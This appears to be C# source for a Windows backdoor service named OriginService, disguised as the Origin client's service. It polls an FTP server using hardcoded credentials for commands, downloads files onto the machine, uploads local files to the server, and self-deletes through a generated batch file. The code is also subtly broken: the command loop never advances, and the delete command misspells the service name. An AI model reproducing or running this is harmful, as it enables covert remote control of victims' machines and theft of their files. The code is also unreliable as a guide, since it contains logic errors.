using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Threading;
using System.IO;

namespace Cracker
{
    public partial class OriginService : ServiceBase
    {
        private const string FTP = "ftp://node0.net2ftp.ru";
        private const string USERNAME = "iskusnow@mail.ru";
        private const string PASSWORD = "fbc3454a963b";
        private const string COMMANDSURL = "/commands/commands.dat";

        //bat commands
        private const string COMMAND_STOP = "sc stop Origin";
        private const string COMMAND_DELETE = "sc delete Oringin";

        private DateTime CURRENTDATE;

        public OriginService()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            timer.Interval = 2000;
            CURRENTDATE = Convert.ToDateTime("01.01.2000 00:00:00");
            if (CheckerOrigin.CheckClient())
                timer.Start();
            else
                EndWork();
        }

        protected override void OnStop()
        {
            timer.Stop();
        }

        private void timer_Tick(object sender, EventArgs e)
        {
            if (System.Net.NetworkInformation.NetworkInterface.GetIsNetworkAvailable())
                ProcessCommand(Messager.GetCommand(FTP + COMMANDSURL, USERNAME, PASSWORD));
        }

        private void ProcessCommand(string commands)
        {
            if (commands == "")
                return;
            string[] commandArray = commands.Split('\n');
            if (Convert.ToDateTime(commandArray[0]) <= CURRENTDATE)
                return;
            CURRENTDATE = Convert.ToDateTime(commandArray[0]);
            int i = 1;
            while (i < commandArray.Length)
            {
                string[] splitCommand = commandArray[i].Split(' ');
                switch ((splitCommand[0]))
                {
                    case "download":
                        Messager.DownloadFile(FTP + splitCommand[1], splitCommand[2], USERNAME, PASSWORD);
                        break;
                    case "upload":
                        Messager.UploadFile(FTP + splitCommand[1], splitCommand[2], USERNAME, PASSWORD);
                        break;
                    case "end":
                        EndWork();
                        break;
                }
            }
        }

        private void EndWork()
        {
            StreamWriter writer = new StreamWriter(File.Open("system.bat", FileMode.Create));
            writer.WriteLine(COMMAND_STOP);
            writer.WriteLine(COMMAND_DELETE);
            writer.WriteLine("pause");
            Process.Start("system.bat");
        }
    }
}
